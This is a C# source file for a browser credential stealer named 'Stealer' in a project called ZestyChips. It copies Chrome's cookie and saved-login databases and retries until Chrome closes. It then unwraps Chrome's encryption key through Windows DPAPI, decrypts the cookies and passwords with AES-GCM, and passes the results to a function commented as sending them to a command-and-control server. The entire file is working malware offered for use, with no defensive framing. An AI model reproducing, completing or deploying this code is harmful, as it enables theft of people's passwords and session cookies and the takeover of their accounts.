using System;
using System.IO;
using System.Threading;
using System.Data.SQLite;
using System.Text.Json;
using System.Security.Cryptography;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.CompilerServices;
using System.ComponentModel;

namespace ZestyChips
{
    internal class Stealer
    {
        /*
        * Main entrypoint for the stealer to begin..
        */
        public static void Start()
        {
            // steal chrome data
            Chrome();
        }

        /*
        * stealer functions for Chrome
        */
        private static void Chrome() {
            string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
            string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
            // Helpers.PrintSuccess($"found chrome cookies: {cookies}");
            // Helpers.PrintSuccess($"found chrome passwords: {login}");
        }
        
        /*
        * Generic entry to steal data from vaults, given an input path and save file name
        * Returns a string, json serialised data
        */
        private static string StealChromeData(string path, string fileSaveName) {
            bool hasChromeCookies = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
            string result;

            if (hasChromeCookies) {
                result = "Chrome not found";
                return result;
            } else {
                Helpers.PrintInfo("Chrome found, copying..");
                for(;;) {
                    // steal chrome cookies
                    try {
                        // copy file to dest file name
                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
                        break;
                    } catch (Exception ex) {
                        // exception will throw most likely if chrome is open
                        // implant will continually run until chrome is closed / process terminated
                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
                        Thread.Sleep(10000); // sleep 10 seconds
                    }
                }

                string data;
                switch (fileSaveName) {
                    case "cc":
                        data = DecryptChromeCookies(fileSaveName);
                        Program.SendBase64EncodedData(data); // send data off to c2
                        return data;
                    
                    case "p":
                        data = DecryptChromePasswords(fileSaveName);
                        Program.SendBase64EncodedData(data); // send data off to c2
                        return data;

                    default:
                        return "error in StealChromeData";
                }
                
            }
        }
        
        /*
        * Decrypt password store, note passwords are separated from username with 3 pipes |||
        */
        private static string DecryptChromePasswords(string dataSourceFile) {
            // open the Chrome cookies database
            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
            sqliteConnection.Open();
            SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", sqliteConnection);
            SQLiteDataReader sdr = sqliteCommand.ExecuteReader();

            // get the encryption key Chrome is using
            byte[] encryptionKey = GetChromeEncryptionKey();

            // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
            Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
            // create a list just incase of some untested error (I dont have the chrome version to test it)
            List<string> passwordResultsList = new List<string>();

            while (sdr.Read()) {
                object obj = sdr["username_value"];
                object obj2 = sdr["action_url"];
                string decryptedOldStylePasswords = "";

                byte[] bytes = GetBytesFromReader(sdr, 2);
                byte[] iv;
                byte[] encryptedBytes;
                Aes256Prepare(bytes, out iv, out encryptedBytes);

                // get new style passwords from vault
                string decryptedPassword = Aes256Decrypt(encryptedBytes, encryptionKey, iv);
                
                // try get old style passwords from vault
                try {
#pragma warning disable CA1416
                    decryptedOldStylePasswords = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])sdr["password_value"], null, DataProtectionScope.CurrentUser));
#pragma warning restore CA1416
                } catch {
                    // leave empty this is ok, this will try read old style chrome password data, it may be 
                    // that it  doesnt  exist :)
                }

                string passwordResult = "";

                if (decryptedPassword != "") {
                    string dict_site = obj2.ToString();
                    string dict_user = obj.ToString();

                    if (dict_site == "") {
                        dict_site = "Site URL not found"; // can't carve out some sites for some reason. E.g. reddit
                    }

                    if (masterDictionary.ContainsKey(dict_site)) {
                        Dictionary<string, string> dictionary2 = masterDictionary;
                        dictionary2[dict_site] = string.Concat(new string[] {
                            dictionary2[dict_site],
                            (dict_user != null) ? dict_user.ToString() : null,
                            "|||",
                            decryptedPassword,
                            "; "
                        });
                    } else {
                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
                    }


                    // passwordResult = string.Concat(new string[] {
                    //     passwordResult,
                    //     (obj2 != null) ? obj2.ToString() : null,
                    //     " ",
                    //     (obj != null) ? obj.ToString() : null,
                    //     " ",
                    //     decryptedPassword,
                    //     " 1\r\n"
                    // });
                } else if (decryptedOldStylePasswords != "") {
                    // this section is untested, so given try catch
                    try {
                        string dict_site = obj2.ToString();
                        string dict_user = obj.ToString();

                        if (masterDictionary.ContainsKey(dict_site)) {
                            Dictionary<string, string> dictionary2 = masterDictionary;
                            dictionary2[dict_site] = string.Concat(new string[] {
                                dictionary2[dict_site],
                                (dict_user != null) ? dict_user.ToString() : null,
                                "|||",
                                decryptedPassword,
                                "; "
                            });
                        } else {
                            masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
                        }
                    } catch {
                        passwordResult = string.Concat(new string[]{
                            passwordResult,
                            (obj2 != null) ? obj2.ToString() : null,
                            " ",
                            (obj != null) ? obj.ToString() : null,
                            " ",
                            decryptedOldStylePasswords,
                            " 2\r\n"
                        });
                        passwordResultsList.Add(passwordResult);
                    }        
                }
            }

            // if we have caught any errors above and have appended to the list
            // just return that list, it will be incomplete overall, but hopefully this 
            // shouldnt be a problem... todo
            // 9 times out of 10 this should never execute.
            if(passwordResultsList.Count != 0) {
                return JsonSerializer.Serialize(passwordResultsList);
            }

            // foreach (var pair in masterDictionary) {
            //     Helpers.PrintSuccess($"Site: {pair.Key}, Value: {pair.Value}");
            // }

            return JsonSerializer.Serialize(masterDictionary);
        }

        private static string Aes256Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv) {
            string result = string.Empty;
            try {
                using (AesGcm aesGcm  = new AesGcm(key, 16)) {
                    // buffer for decrypted data
                    byte[] decryptedData = new byte[encryptedBytes.Length - 16];
                    byte[] tag = new byte[16]; 
                    Array.Copy(encryptedBytes, encryptedBytes.Length - 16, tag, 0, 16); // copy the last 16 bytes for the tag
                    byte[] ciphertext = new byte[encryptedBytes.Length - 16]; // resize for the ciphertext
                    Array.Copy(encryptedBytes, 0, ciphertext, 0, encryptedBytes.Length - 16); // copy the encrypted data excluding the tag

                    aesGcm.Decrypt(iv, ciphertext, tag, decryptedData);

                    // convert decrypted data to string
                    result = Encoding.UTF8.GetString(decryptedData);
                }
            } catch (Exception ex) {
                Helpers.PrintFail($"decryption failed: {ex.Message}");
            }

            return result;
        }

        private static void Aes256Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag) {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        private static byte[] GetBytesFromReader(SQLiteDataReader reader, int columnIndex)
        {
            // do not read past the end of the stream
            if (!reader.IsDBNull(columnIndex))
            {
                long dataSize = reader.GetBytes(columnIndex, 0, null, 0, 0); // length of the data
                byte[] data = new byte[dataSize];

                long bytesRead = reader.GetBytes(columnIndex, 0, data, 0, data.Length);
                if (bytesRead != dataSize)
                {
                    throw new InvalidOperationException("Data size mismatch");
                }

                return data;
            }

            return null;
        }

        // get enckey from Chrome/User Data/Local State
        private static byte[] GetChromeEncryptionKey() {
            string localStateFileData = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "/../Local/Google/Chrome/User Data/Local State");

            // use native tools to pull out the encrypted encryption key used by Chrome
            using JsonDocument doc = JsonDocument.Parse(localStateFileData);
            string encryptedKey = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();

#pragma warning disable CA1416
            byte[] encryptionKey = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
#pragma warning restore CA1416

            return encryptionKey;
        }

        private static string DecryptChromeCookies(string dataSourceFile) {

            // open the Chrome cookies database
            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
            sqliteConnection.Open();
            SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);            
            SQLiteDataReader sdr = sqliteCommand.ExecuteReader();

            // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
            Dictionary<string, string> masterDictionary = new Dictionary<string, string>();


            // decode & decrypt the encryption key
            while (sdr.Read()) {
                byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
                byte[] encryptionKey = GetChromeEncryptionKey();

                // decrypt encrypted data from chrome
                using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
                    using (BinaryReader binaryReader = new BinaryReader(memoryStream)) {
                        byte[] skippedBytes = binaryReader.ReadBytes(3); 

                        byte[] nonce = binaryReader.ReadBytes(12);
                        byte[] cipherTextWithTag = binaryReader.ReadBytes(rawEncryptedChromeRow.Length - 3 - 12); // remaining bytes are ciphertext plus tag

                        byte[] cipherText = new byte[cipherTextWithTag.Length - 16];
                        byte[] tag = new byte[16];
                        Array.Copy(cipherTextWithTag, 0, cipherText, 0, cipherText.Length);
                        Array.Copy(cipherTextWithTag, cipherText.Length, tag, 0, tag.Length);

                        byte[] decryptedData = new byte[cipherText.Length];

                        using (AesGcm aesGcm = new AesGcm(encryptionKey, tag.Length)) {
                            try {
                                aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
                                string decryptedString = Encoding.UTF8.GetString(decryptedData);

                                // iterate through each row and store into our masterDictionary
                                string key = sdr["host_key"].ToString();
                                object value = sdr["name"];

                                // if the key (site) already exists in masterDictionary, append the data to that key with data_key=data_val
                                // else, add a new key-value pair.
                                if (masterDictionary.ContainsKey(key)) {
                                    Dictionary<string, string> dictionary2 = masterDictionary;
                                    dictionary2[key] = string.Concat(new string[] {
                                        dictionary2[key],
                                        (value != null) ? value.ToString() : null,
                                        "=",
                                        decryptedString,
                                        "; "
                                    });
                                } else {
                                    masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "=" + decryptedString + "; ");
                                }
                            }
                            catch (Exception ex) {
                                Helpers.PrintFail($"failed to decrypt data: {ex}");
                                return "Error decrypting chrome data";
                            }
                        }
                    }
                }

            }

            // serialise to JSON and ret
            return JsonSerializer.Serialize(masterDictionary);
        }
    }
}
